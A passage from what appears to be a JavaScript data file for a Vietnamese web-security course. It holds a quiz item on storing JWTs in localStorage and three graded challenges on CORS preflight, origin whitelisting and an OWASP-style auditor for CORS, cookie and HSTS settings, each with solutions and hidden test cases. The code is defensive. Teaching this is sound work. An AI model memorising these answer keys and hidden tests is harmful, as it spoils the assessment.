      id: 'c3-l3-q8',
      question: 'Tại sao việc lưu trữ JWT Access Token hoặc Refresh Token trong window.localStorage lại bị chuẩn bảo mật OWASP cảnh báo là rủi ro nghiêm trọng so với dùng HttpOnly Cookie?',
      options: [
        'Vì bộ nhớ localStorage tự động đồng bộ hóa toàn bộ dữ liệu văn bản không mã hóa lên các máy chủ tìm kiếm công cộng mỗi khi trình duyệt kết nối mạng.',
        'Vì mọi đoạn mã JavaScript chạy trên trang (bao gồm cả hơn 1,000 thư viện npm bên thứ ba nếu bị dính lỗ hổng XSS hoặc Supply-Chain Attack) đều có thể gọi localStorage.getItem() để lấy cắp Token tức thì.',
        'Vì dung lượng lưu trữ tối đa của toàn bộ vùng nhớ localStorage trên các trình duyệt hiện đại chỉ giới hạn ở mức 128 Bytes nên làm cắt cụt phần chữ ký số của chuỗi JWT.',
        'Vì nhân trình duyệt sẽ tự động xóa sạch toàn bộ dữ liệu trong localStorage sau mỗi chu kỳ 60 giây không tương tác chuột, làm gián đoạn trải nghiệm của người dùng.'
      ],
      correctIndex: 1,
      explanation: 'localStorage hoàn toàn không có bất kỳ cơ chế phân quyền hay cô lập nào đối với mã JavaScript chạy trong cùng một Origin. Chỉ cần một lỗ hổng XSS nhỏ trên trang hoặc một thư viện npm bên thứ ba bị chèn mã độc (Supply-Chain Attack), kẻ tấn công có thể đọc toàn bộ nội dung localStorage và gửi về máy chủ từ xa trong vài mili-giây.'
    }
  ],
  codeChallenge: {
    level: 'basic',
    levelLabel: 'Mức 1 · Cơ bản (Làm quen công thức)',
    title: 'Bài 1: Phân Loại Yêu Cầu CORS Preflight & Tính Thời Gian Tiết Kiệm Nhờ Max-Age Cache',
    description: 'Viết hàm `analyzeCorsPreflightImpact(method, contentType, hasCustomHeaders, totalRequestsInSession, rttMs, maxAgeSeconds)` để xác định xem một lời gọi API Cross-Origin có kích hoạt gói tin thăm dò `OPTIONS` hay không và tính thời gian mạng tiết kiệm được:\n- Một yêu cầu được coi là **Simple Request** (`requiresPreflight = false`) khi và chỉ khi thỏa mãn đồng thời cả 3 điều kiện:\n  1. `method` nằm trong `["GET", "HEAD", "POST"]`\n  2. `contentType` nằm trong `["text/plain", "multipart/form-data", "application/x-www-form-urlencoded"]`\n  3. `hasCustomHeaders === false`\n  Ngược lại thì `requiresPreflight = true`.\n- Nếu `requiresPreflight === false`, số lượng gói tin `OPTIONS` phải gửi (`optionsRequestsSent`) bằng `0` và thời gian tiết kiệm (`savedLatencyMs`) bằng `0`.\n- Nếu `requiresPreflight === true`:\n  + Nếu `maxAgeSeconds > 0`, trình duyệt chỉ gửi đúng `1` gói `OPTIONS` ở lần đầu tiên (`optionsRequestsSent = totalRequestsInSession > 0 ? 1 : 0`), và thời gian mạng tiết kiệm được là `savedLatencyMs = Math.max(0, totalRequestsInSession - 1) * rttMs` (làm tròn 2 chữ số thập phân).\n  + Nếu `maxAgeSeconds <= 0`, trình duyệt phải gửi gói `OPTIONS` trước mỗi request (`optionsRequestsSent = totalRequestsInSession`) và `savedLatencyMs = 0`.',
    guidedSteps: [
      'Bước 1 (Kiểm tra điều kiện Simple Request): Kiểm tra xem method có thuộc ["GET", "HEAD", "POST"], contentType có thuộc 3 kiểu form/text cơ bản và hasCustomHeaders === false hay không để suy ra requiresPreflight.',
      'Bước 2 (Xử lý trường hợp không cần Preflight): Nếu requiresPreflight === false, trả về ngay { requiresPreflight: false, optionsRequestsSent: 0, savedLatencyMs: 0 }.',
      'Bước 3 (Tính số gói OPTIONS và độ trễ tiết kiệm khi có Preflight): Nếu maxAgeSeconds > 0 thì optionsRequestsSent = totalRequestsInSession > 0 ? 1 : 0 và savedLatencyMs = Math.max(0, totalRequestsInSession - 1) * rttMs; ngược lại optionsRequestsSent = totalRequestsInSession và savedLatencyMs = 0.',
      'Bước 4 (Làm tròn và hoàn trả kết quả): Làm tròn savedLatencyMs tới 2 chữ số thập phân và trả về object { requiresPreflight, optionsRequestsSent, savedLatencyMs }.'
    ],
    hints: [
      'Lưu ý rằng ngay cả với phương thức POST hoặc GET, nếu Content-Type là "application/json" hoặc hasCustomHeaders là true (ví dụ có header Authorization), nó vẫn bắt buộc phải kích hoạt Preflight OPTIONS!',
      'Dùng Math.round(val * 100) / 100 để làm tròn savedLatencyMs.'
    ],
    starterCode: `function analyzeCorsPreflightImpact(method, contentType, hasCustomHeaders, totalRequestsInSession, rttMs, maxAgeSeconds) {
  // Bước 1: Kiểm tra 3 điều kiện của Simple Request để xác định biến boolean requiresPreflight
  
  // Bước 2: Nếu không cần Preflight, trả về optionsRequestsSent = 0 và savedLatencyMs = 0
  
  // Bước 3: Nếu cần Preflight, tính optionsRequestsSent và savedLatencyMs dựa trên maxAgeSeconds
  
  // Bước 4: Trả về { requiresPreflight, optionsRequestsSent, savedLatencyMs }
}`,
    solution: `function analyzeCorsPreflightImpact(method, contentType, hasCustomHeaders, totalRequestsInSession, rttMs, maxAgeSeconds) {
  const simpleMethods = ['GET', 'HEAD', 'POST'];
  const simpleContentTypes = [
    'text/plain',
    'multipart/form-data',
    'application/x-www-form-urlencoded',
  ];

  const isSimple =
    simpleMethods.includes(method) &&
    simpleContentTypes.includes(contentType) &&
    hasCustomHeaders === false;
  const requiresPreflight = !isSimple;

  if (!requiresPreflight) {
    return {
      requiresPreflight: false,
      optionsRequestsSent: 0,
      savedLatencyMs: 0,
    };
  }

  if (maxAgeSeconds > 0) {
    const optionsRequestsSent = totalRequestsInSession > 0 ? 1 : 0;
    const rawSaved = Math.max(0, totalRequestsInSession - 1) * rttMs;
    const savedLatencyMs = Math.round(rawSaved * 100) / 100;
    return {
      requiresPreflight: true,
      optionsRequestsSent,
      savedLatencyMs,
    };
  }

  return {
    requiresPreflight: true,
    optionsRequestsSent: totalRequestsInSession,
    savedLatencyMs: 0,
  };
}`,
    testCases: [
      {
        name: 'Case 1 công khai: Gọi API POST application/json 25 lần có bật Access-Control-Max-Age: 86400s giúp tiết kiệm 24 RTT',
        input: ['POST', 'application/json', true, 25, 60, 86400],
        expected: {
          requiresPreflight: true,
          optionsRequestsSent: 1,
          savedLatencyMs: 1440
        },
        hidden: false
      },
      {
        name: 'Case 2 công khai: Yêu cầu HTML Form POST cổ điển không có custom header là Simple Request (0 Preflight)',
        input: ['POST', 'application/x-www-form-urlencoded', false, 20, 50, 0],
        expected: {
          requiresPreflight: false,
          optionsRequestsSent: 0,
          savedLatencyMs: 0
        },
        hidden: false
      },
      {
        name: 'Case 3 công khai: Yêu cầu DELETE cần Preflight nhưng quên bật Max-Age (maxAgeSeconds = 0) phải gửi OPTIONS mọi lần',
        input: ['DELETE', 'text/plain', false, 10, 45, 0],
        expected: {
          requiresPreflight: true,
          optionsRequestsSent: 10,
          savedLatencyMs: 0
        },
        hidden: false
      },
      {
        name: 'Case 4 ẩn: Yêu cầu GET đơn giản nhưng có đính kèm custom header (Authorization) vẫn kích hoạt Preflight',
        input: ['GET', 'text/plain', true, 15, 30.5, 3600],
        expected: {
          requiresPreflight: true,
          optionsRequestsSent: 1,
          savedLatencyMs: 427
        },
        hidden: true
      },
      {
        name: 'Case 5 ẩn: Phiên làm việc chỉ có đúng 1 request duy nhất',
        input: ['PUT', 'application/json', true, 1, 80, 86400],
        expected: {
          requiresPreflight: true,
          optionsRequestsSent: 1,
          savedLatencyMs: 0
        },
        hidden: true
      }
    ]
  },
  codeChallenges: [
    {
      level: 'basic',
      levelLabel: 'Mức 1 · Cơ bản (Làm quen công thức)',
      title: 'Bài 1: Phân Loại Yêu Cầu CORS Preflight & Tính Thời Gian Tiết Kiệm Nhờ Max-Age Cache',
      description: 'Viết hàm `analyzeCorsPreflightImpact(method, contentType, hasCustomHeaders, totalRequestsInSession, rttMs, maxAgeSeconds)` để xác định xem một lời gọi API Cross-Origin có kích hoạt gói tin thăm dò `OPTIONS` hay không và tính thời gian mạng tiết kiệm được:\n- Một yêu cầu được coi là **Simple Request** (`requiresPreflight = false`) khi và chỉ khi thỏa mãn đồng thời cả 3 điều kiện:\n  1. `method` nằm trong `["GET", "HEAD", "POST"]`\n  2. `contentType` nằm trong `["text/plain", "multipart/form-data", "application/x-www-form-urlencoded"]`\n  3. `hasCustomHeaders === false`\n  Ngược lại thì `requiresPreflight = true`.\n- Nếu `requiresPreflight === false`, số lượng gói tin `OPTIONS` phải gửi (`optionsRequestsSent`) bằng `0` và thời gian tiết kiệm (`savedLatencyMs`) bằng `0`.\n- Nếu `requiresPreflight === true`:\n  + Nếu `maxAgeSeconds > 0`, trình duyệt chỉ gửi đúng `1` gói `OPTIONS` ở lần đầu tiên (`optionsRequestsSent = totalRequestsInSession > 0 ? 1 : 0`), và thời gian mạng tiết kiệm được là `savedLatencyMs = Math.max(0, totalRequestsInSession - 1) * rttMs` (làm tròn 2 chữ số thập phân).\n  + Nếu `maxAgeSeconds <= 0`, trình duyệt phải gửi gói `OPTIONS` trước mỗi request (`optionsRequestsSent = totalRequestsInSession`) và `savedLatencyMs = 0`.',
      guidedSteps: [
        'Bước 1 (Kiểm tra điều kiện Simple Request): Kiểm tra xem method có thuộc ["GET", "HEAD", "POST"], contentType có thuộc 3 kiểu form/text cơ bản và hasCustomHeaders === false hay không để suy ra requiresPreflight.',
        'Bước 2 (Xử lý trường hợp không cần Preflight): Nếu requiresPreflight === false, trả về ngay { requiresPreflight: false, optionsRequestsSent: 0, savedLatencyMs: 0 }.',
        'Bước 3 (Tính số gói OPTIONS và độ trễ tiết kiệm khi có Preflight): Nếu maxAgeSeconds > 0 thì optionsRequestsSent = totalRequestsInSession > 0 ? 1 : 0 và savedLatencyMs = Math.max(0, totalRequestsInSession - 1) * rttMs; ngược lại optionsRequestsSent = totalRequestsInSession và savedLatencyMs = 0.',
        'Bước 4 (Làm tròn và hoàn trả kết quả): Làm tròn savedLatencyMs tới 2 chữ số thập phân và trả về object { requiresPreflight, optionsRequestsSent, savedLatencyMs }.'
      ],
      hints: [
        'Lưu ý rằng ngay cả với phương thức POST hoặc GET, nếu Content-Type là "application/json" hoặc hasCustomHeaders là true (ví dụ có header Authorization), nó vẫn bắt buộc phải kích hoạt Preflight OPTIONS!',
        'Dùng Math.round(val * 100) / 100 để làm tròn savedLatencyMs.'
      ],
      starterCode: `function analyzeCorsPreflightImpact(method, contentType, hasCustomHeaders, totalRequestsInSession, rttMs, maxAgeSeconds) {
  // Bước 1: Kiểm tra 3 điều kiện của Simple Request để xác định biến boolean requiresPreflight
  
  // Bước 2: Nếu không cần Preflight, trả về optionsRequestsSent = 0 và savedLatencyMs = 0
  
  // Bước 3: Nếu cần Preflight, tính optionsRequestsSent và savedLatencyMs dựa trên maxAgeSeconds
  
  // Bước 4: Trả về { requiresPreflight, optionsRequestsSent, savedLatencyMs }
}`,
      solution: `function analyzeCorsPreflightImpact(method, contentType, hasCustomHeaders, totalRequestsInSession, rttMs, maxAgeSeconds) {
  const simpleMethods = ['GET', 'HEAD', 'POST'];
  const simpleContentTypes = [
    'text/plain',
    'multipart/form-data',
    'application/x-www-form-urlencoded',
  ];

  const isSimple =
    simpleMethods.includes(method) &&
    simpleContentTypes.includes(contentType) &&
    hasCustomHeaders === false;
  const requiresPreflight = !isSimple;

  if (!requiresPreflight) {
    return {
      requiresPreflight: false,
      optionsRequestsSent: 0,
      savedLatencyMs: 0,
    };
  }

  if (maxAgeSeconds > 0) {
    const optionsRequestsSent = totalRequestsInSession > 0 ? 1 : 0;
    const rawSaved = Math.max(0, totalRequestsInSession - 1) * rttMs;
    const savedLatencyMs = Math.round(rawSaved * 100) / 100;
    return {
      requiresPreflight: true,
      optionsRequestsSent,
      savedLatencyMs,
    };
  }

  return {
    requiresPreflight: true,
    optionsRequestsSent: totalRequestsInSession,
    savedLatencyMs: 0,
  };
}`,
      testCases: [
        {
          name: 'Case 1 công khai: Gọi API POST application/json 25 lần có bật Access-Control-Max-Age: 86400s giúp tiết kiệm 24 RTT',
          input: ['POST', 'application/json', true, 25, 60, 86400],
          expected: {
            requiresPreflight: true,
            optionsRequestsSent: 1,
            savedLatencyMs: 1440
          },
          hidden: false
        },
        {
          name: 'Case 2 công khai: Yêu cầu HTML Form POST cổ điển không có custom header là Simple Request (0 Preflight)',
          input: ['POST', 'application/x-www-form-urlencoded', false, 20, 50, 0],
          expected: {
            requiresPreflight: false,
            optionsRequestsSent: 0,
            savedLatencyMs: 0
          },
          hidden: false
        },
        {
          name: 'Case 3 công khai: Yêu cầu DELETE cần Preflight nhưng quên bật Max-Age (maxAgeSeconds = 0) phải gửi OPTIONS mọi lần',
          input: ['DELETE', 'text/plain', false, 10, 45, 0],
          expected: {
            requiresPreflight: true,
            optionsRequestsSent: 10,
            savedLatencyMs: 0
          },
          hidden: false
        },
        {
          name: 'Case 4 ẩn: Yêu cầu GET đơn giản nhưng có đính kèm custom header (Authorization) vẫn kích hoạt Preflight',
          input: ['GET', 'text/plain', true, 15, 30.5, 3600],
          expected: {
            requiresPreflight: true,
            optionsRequestsSent: 1,
            savedLatencyMs: 427
          },
          hidden: true
        },
        {
          name: 'Case 5 ẩn: Phiên làm việc chỉ có đúng 1 request duy nhất',
          input: ['PUT', 'application/json', true, 1, 80, 86400],
          expected: {
            requiresPreflight: true,
            optionsRequestsSent: 1,
            savedLatencyMs: 0
          },
          hidden: true
        }
      ]
    },
    {
      level: 'intermediate',
      levelLabel: 'Mức 2 · Trung bình (Mô hình hoá hệ thống)',
      title: 'Bài 2: Xây Dựng Bộ Kiểm Duyệt CORS Origin Whitelist Kèm Chống Đầu Độc Cache (Vary: Origin)',
      description: 'Hiện thực hàm `validateCorsOrigin(requestOrigin, whitelist)` để kiểm tra nguồn gốc yêu cầu và sinh tiêu đề phản hồi an toàn:\n- Luôn đính kèm trường `varyHeader: "Origin"` trong mọi kết quả trả về để ngăn chặn lỗi đầu độc bộ đệm CDN.\n- Nếu `!requestOrigin` (tức `requestOrigin === undefined` hoặc `""` — tương ứng với lệnh gọi Server-to-Server nội bộ hoặc Mobile App Native), trả về `{ isAllowed: true, allowOriginHeader: "", varyHeader: "Origin" }`.\n- Nếu có `requestOrigin` và `Array.isArray(whitelist)` chứa chính xác `requestOrigin` (và `requestOrigin !== "*"`), trả về `{ isAllowed: true, allowOriginHeader: requestOrigin, varyHeader: "Origin" }`.\n- Trong mọi trường hợp còn lại (không nằm trong whitelist, whitelist rỗng hoặc `requestOrigin === "*"`), trả về `{ isAllowed: false, allowOriginHeader: "", varyHeader: "Origin" }`.',
      guidedSteps: [
        'Bước 1 (Kiểm tra request không có Origin): Nếu !requestOrigin, trả về { isAllowed: true, allowOriginHeader: "", varyHeader: "Origin" }.',
        'Bước 2 (Chặn ký tự đại diện và kiểm tra Whitelist): Kiểm tra requestOrigin !== "*" && Array.isArray(whitelist) && whitelist.includes(requestOrigin).',
        'Bước 3 (Trả về tiêu đề khi hợp lệ): Nếu nằm trong Whitelist, trả về { isAllowed: true, allowOriginHeader: requestOrigin, varyHeader: "Origin" }.',
        'Bước 4 (Từ chối các Origin lạ): Mặc định trả về { isAllowed: false, allowOriginHeader: "", varyHeader: "Origin" }.'
      ],
      hints: [
        'Đừng quên kiểm tra điều kiện requestOrigin !== "*" để phòng trường hợp ai đó cấu hình nhầm dấu "*" vào mảng whitelist khi đang bật Credentials.',
        'Trường varyHeader luôn mang giá trị cố định "Origin" ở cả 3 nhánh trả về.'
      ],
      starterCode: `function validateCorsOrigin(requestOrigin, whitelist) {
  // Bước 1: Xử lý trường hợp không có requestOrigin (Server-to-Server call)
  
  // Bước 2: Kiểm tra requestOrigin trong mảng whitelist (cấm dấu "*")
  
  // Bước 3: Trả về kết quả cho phép kèm allowOriginHeader và varyHeader: "Origin"
  
  // Bước 4: Trả về kết quả từ chối nếu không khớp whitelist
}`,
      solution: `function validateCorsOrigin(requestOrigin, whitelist) {
  if (!requestOrigin) {
    return {
      isAllowed: true,
      allowOriginHeader: '',
      varyHeader: 'Origin',
    };
  }

  if (
    requestOrigin !== '*' &&
    Array.isArray(whitelist) &&
    whitelist.includes(requestOrigin)
  ) {
    return {
      isAllowed: true,
      allowOriginHeader: requestOrigin,
      varyHeader: 'Origin',
    };
  }

  return {
    isAllowed: false,
    allowOriginHeader: '',
    varyHeader: 'Origin',
  };
}`,
      testCases: [
        {
          name: 'Case 1 công khai: Cho phép Origin hợp lệ nằm trong Whitelist và trả kèm Vary: Origin',
          input: [
            'https://app.arc-irobot.tech',
            ['https://app.arc-irobot.tech', 'https://admin.arc-irobot.tech']
          ],
          expected: {
            isAllowed: true,
            allowOriginHeader: 'https://app.arc-irobot.tech',
            varyHeader: 'Origin'
          },
          hidden: false
        },
        {
          name: 'Case 2 công khai: Chặn đứng Origin lừa đảo không nằm trong Whitelist',
          input: ['https://evil-hacker.com', ['https://app.arc-irobot.tech']],
          expected: {
            isAllowed: false,
            allowOriginHeader: '',
            varyHeader: 'Origin'
          },
          hidden: false
        },
        {
          name: 'Case 3 công khai: Cho phép yêu cầu Server-to-Server không có tiêu đề Origin',
          input: [undefined, ['https://app.arc-irobot.tech']],
          expected: {
            isAllowed: true,
            allowOriginHeader: '',
            varyHeader: 'Origin'
          },
          hidden: false
        },
        {
          name: 'Case 4 ẩn: Chặn trường hợp truyền dấu "*" làm Origin ngay cả khi whitelist có chứa "*"',
          input: ['*', ['*', 'https://app.arc-irobot.tech']],
          expected: {
            isAllowed: false,
            allowOriginHeader: '',
            varyHeader: 'Origin'
          },
          hidden: true
        },
        {
          name: 'Case 5 ẩn: Whitelist rỗng chặn mọi yêu cầu từ trình duyệt',
          input: ['https://admin.arc-irobot.tech', []],
          expected: {
            isAllowed: false,
            allowOriginHeader: '',
            varyHeader: 'Origin'
          },
          hidden: true
        }
      ]
    },
    {
      level: 'advanced',
      levelLabel: 'Mức 3 · Nâng cao (Chuẩn Production)',
      title: 'Bài 3: Bộ Kiểm Toán Toàn Diện Chính Sách An Toàn CORS, Cookie __Host- Và HSTS (OWASP Security Auditor)',
      description: 'Hiện thực hàm `auditWebSecurityPolicy(policy)` để kiểm toán tự động cấu hình bảo mật tầng mạng của dịch vụ NestJS theo chuẩn OWASP ASVS:\n1. **Kiểm tra hợp lệ đầu vào (Validation):** Nếu `!policy` hoặc `typeof policy !== "object"` hoặc `!policy.cookie` hoặc `typeof policy.hstsMaxAgeSeconds !== "number"`, lập tức ném lỗi `throw new Error("INVALID_SECURITY_POLICY_INPUT")`.\n2. **Thu thập danh sách lỗ hổng (`vulnerabilities: string[]`) theo đúng thứ tự kiểm tra sau:**\n   - **Kiểm tra 1 (CORS Wildcard / Blind Reflection):** Nếu `policy.allowCredentials === true` VÀ (`policy.allowOrigin === "*"` hoặc `policy.reflectAnyOrigin === true`), đẩy mã lỗi `"CRITICAL_CORS_CREDENTIAL_EXPOSURE"` vào mảng.\n   - **Kiểm tra 2 (Thiếu Vary: Origin khi dùng Dynamic Whitelist):** Nếu `policy.allowOrigin !== "*"` và `policy.hasVaryOriginHeader !== true`, đẩy mã lỗi `"MISSING_VARY_ORIGIN_CACHE_POISONING"` vào mảng.\n   - **Kiểm tra 3 (Cờ HttpOnly & Secure của Cookie):** Nếu `policy.cookie.httpOnly !== true`, đẩy `"MISSING_COOKIE_HTTPONLY"`; nếu `policy.cookie.secure !== true`, đẩy `"MISSING_COOKIE_SECURE"`.\n   - **Kiểm tra 4 (Quy tắc SameSite=None và Tiền tố `__Host-`):**\n     + Nếu `policy.cookie.sameSite === "None"` và `policy.cookie.secure !== true`, đẩy `"INVALID_SAMESITE_NONE_WITHOUT_SECURE"`.\n     + Nếu `String(policy.cookie.name).startsWith("__Host-")` mà (`policy.cookie.secure !== true` hoặc `policy.cookie.path !== "/"` || `Boolean(policy.cookie.domain)`), đẩy `"VIOLATED_HOST_COOKIE_PREFIX_RULES"`.\n   - **Kiểm tra 5 (Thời hạn HSTS):** Nếu `policy.hstsMaxAgeSeconds < 31536000` (dưới 1 năm), đẩy `"WEAK_HSTS_MAX_AGE"`.\n3. **Trả về kết quả:** `{ isCompliant: vulnerabilities.length === 0, vulnerabilityCount: vulnerabilities.length, vulnerabilities }`.',
      guidedSteps: [
        'Bước 1 (Xác thực đối tượng policy): Kiểm tra !policy || typeof policy !== "object" || !policy.cookie || typeof policy.hstsMaxAgeSeconds !== "number" để throw new Error("INVALID_SECURITY_POLICY_INPUT").',
        'Bước 2 (Kiểm toán cấu hình CORS): Kiểm tra lỗi CRITICAL_CORS_CREDENTIAL_EXPOSURE và MISSING_VARY_ORIGIN_CACHE_POISONING theo điều kiện đề bài.',
        'Bước 3 (Kiểm toán cờ Cookie và tiền tố __Host-): Kiểm tra tuần tự MISSING_COOKIE_HTTPONLY, MISSING_COOKIE_SECURE, INVALID_SAMESITE_NONE_WITHOUT_SECURE và VIOLATED_HOST_COOKIE_PREFIX_RULES.',
        'Bước 4 (Kiểm toán HSTS và hoàn trả báo cáo): Kiểm tra policy.hstsMaxAgeSeconds < 31536000 -> "WEAK_HSTS_MAX_AGE", sau đó trả về { isCompliant, vulnerabilityCount, vulnerabilities }.'
      ],
      hints: [
        'Giữ đúng thứ tự kiểm tra từ 1 đến 5 để mảng vulnerabilities luôn khớp chính xác với thứ tự kỳ vọng trong các Test Cases.',
        'Với tiền tố __Host-, điều kiện hợp lệ là secure === true, path === "/" và không được có domain (tức !policy.cookie.domain). Nếu vi phạm bất kỳ 1 trong 3 điều kiện này thì đẩy mã lỗi "VIOLATED_HOST_COOKIE_PREFIX_RULES".'
      ],
      starterCode: `function auditWebSecurityPolicy(policy) {
  // Bước 1: Kiểm tra tính hợp lệ của policy, ném Error("INVALID_SECURITY_POLICY_INPUT") nếu thiếu thông tin
  
  // Bước 2: Kiểm tra các lỗ hổng về CORS (Credentials + Wildcard/Reflection và Vary: Origin)
  
  // Bước 3: Kiểm tra các cờ bảo mật của Cookie (HttpOnly, Secure, SameSite=None, tiền tố __Host-)
  
  // Bước 4: Kiểm tra thời hạn HSTS (< 31536000) và trả về { isCompliant, vulnerabilityCount, vulnerabilities }
}`,
      solution: `function auditWebSecurityPolicy(policy) {
  if (
    !policy ||
    typeof policy !== 'object' ||
    !policy.cookie ||
    typeof policy.hstsMaxAgeSeconds !== 'number'
  ) {
    throw new Error('INVALID_SECURITY_POLICY_INPUT');
  }

  const vulnerabilities = [];

  if (
    policy.allowCredentials === true &&
    (policy.allowOrigin === '*' || policy.reflectAnyOrigin === true)
  ) {
    vulnerabilities.push('CRITICAL_CORS_CREDENTIAL_EXPOSURE');
  }

  if (policy.allowOrigin !== '*' && policy.hasVaryOriginHeader !== true) {
    vulnerabilities.push('MISSING_VARY_ORIGIN_CACHE_POISONING');
  }

  const c = policy.cookie;
  if (c.httpOnly !== true) {
    vulnerabilities.push('MISSING_COOKIE_HTTPONLY');
  }
  if (c.secure !== true) {
    vulnerabilities.push('MISSING_COOKIE_SECURE');
  }
  if (c.sameSite === 'None' && c.secure !== true) {
    vulnerabilities.push('INVALID_SAMESITE_NONE_WITHOUT_SECURE');
  }
  if (
    String(c.name || '').startsWith('__Host-') &&
    (c.secure !== true || c.path !== '/' || Boolean(c.domain))
  ) {
    vulnerabilities.push('VIOLATED_HOST_COOKIE_PREFIX_RULES');
  }

  if (policy.hstsMaxAgeSeconds < 31536000) {
    vulnerabilities.push('WEAK_HSTS_MAX_AGE');
  }

  return {
    isCompliant: vulnerabilities.length === 0,
    vulnerabilityCount: vulnerabilities.length,
    vulnerabilities,
  };
}`,
      testCases: [
        {
          name: 'Case 1 công khai: Cấu hình chuẩn OWASP ASVS hoàn hảo (Whitelist + Vary + __Host- Cookie + HSTS 1 năm)',
          input: [
            {
              allowOrigin: 'https://app.arc-irobot.tech',
              allowCredentials: true,
              reflectAnyOrigin: false,
              hasVaryOriginHeader: true,
              hstsMaxAgeSeconds: 31536000,
              cookie: {
                name: '__Host-refresh_token',
                httpOnly: true,
                secure: true,
                sameSite: 'Strict',
                path: '/',
                domain: ''
              }
            }
          ],
          expected: {
            isCompliant: true,
            vulnerabilityCount: 0,
            vulnerabilities: []
          },
          hidden: false
        },
        {
          name: 'Case 2 công khai: Phát hiện lỗi CORS phản chiếu mù quáng, thiếu Vary: Origin và vi phạm quy tắc tiền tố __Host-',
          input: [
            {
              allowOrigin: 'https://evil.com',
              allowCredentials: true,
              reflectAnyOrigin: true,
              hasVaryOriginHeader: false,
              hstsMaxAgeSeconds: 31536000,
              cookie: {
                name: '__Host-session',
                httpOnly: true,
                secure: true,
                sameSite: 'Lax',
                path: '/api',
                domain: '.arc-irobot.tech'
              }
            }
          ],
          expected: {
            isCompliant: false,
            vulnerabilityCount: 3,
            vulnerabilities: [
              'CRITICAL_CORS_CREDENTIAL_EXPOSURE',
              'MISSING_VARY_ORIGIN_CACHE_POISONING',
              'VIOLATED_HOST_COOKIE_PREFIX_RULES'
            ]
          },
          hidden: false
        },
        {
          name: 'Case 3 công khai: Phát hiện Cookie thiếu HttpOnly, Secure đi kèm SameSite=None và HSTS quá ngắn',
          input: [
            {
              allowOrigin: 'https://app.arc-irobot.tech',
              allowCredentials: true,
              reflectAnyOrigin: false,
              hasVaryOriginHeader: true,
              hstsMaxAgeSeconds: 3600,
              cookie: {
                name: 'sid',
                httpOnly: false,
                secure: false,
                sameSite: 'None',
                path: '/'
              }
            }
          ],
          expected: {
            isCompliant: false,
            vulnerabilityCount: 4,
            vulnerabilities: [
              'MISSING_COOKIE_HTTPONLY',
              'MISSING_COOKIE_SECURE',
              'INVALID_SAMESITE_NONE_WITHOUT_SECURE',
              'WEAK_HSTS_MAX_AGE'
            ]
          },
          hidden: false
        },
        {
          name: 'Case 4 ẩn: Lỗi kết hợp Allow-Origin: * với Allow-Credentials: true',
          input: [
            {
              allowOrigin: '*',
              allowCredentials: true,
              reflectAnyOrigin: false,
              hasVaryOriginHeader: false,
              hstsMaxAgeSeconds: 63072000,
              cookie: {
                name: 'token',
                httpOnly: true,
                secure: true,
                sameSite: 'Lax',
                path: '/'
              }
            }
          ],
          expected: {
            isCompliant: false,
            vulnerabilityCount: 1,
            vulnerabilities: ['CRITICAL_CORS_CREDENTIAL_EXPOSURE']
          },
          hidden: true
        },
        {
          name: 'Case 5 ẩn: Tham số đầu vào null hoặc thiếu thông tin cookie -> Ném lỗi INVALID_SECURITY_POLICY_INPUT',
          input: [{ allowOrigin: '*' }],
          expected: 'ERROR_THROWN',
          hidden: true
        }
      ]
    }
  ]
};
